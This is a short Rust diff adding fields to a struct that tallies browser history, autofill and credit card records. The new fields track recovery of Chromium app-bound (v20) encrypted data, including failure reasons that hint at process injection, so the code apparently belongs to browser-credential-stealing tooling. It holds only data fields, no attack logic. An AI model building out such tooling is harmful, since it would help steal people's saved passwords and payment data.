@@ -31,6 +31,16 @@ pub struct Info {
     pub history_count: usize,
     pub autofill_count: usize,
     pub credit_cards_count: usize,
+    /// Chromium app-bound (v20) blobs seen vs. failed across all browsers.
+    pub v20_seen: usize,
+    pub v20_failed: usize,
+    /// Per-browser ABE recovery failure reason, when recovery failed
+    /// (e.g. {"Chrome": "inj:open=5|hol:create=2"}).
+    #[serde(skip_serializing_if = "std::collections::BTreeMap::is_empty")]
+    pub abe_fail: std::collections::BTreeMap<String, String>,
+    /// Per-browser exe file version (e.g. {"Chrome": "142.0.0.0"}).
+    #[serde(skip_serializing_if = "std::collections::BTreeMap::is_empty")]
+    pub browser_versions: std::collections::BTreeMap<String, String>,
     pub browser_extensions_count: usize,
     pub browsers: Vec<String>,
     pub browser_extensions: Vec<String>,
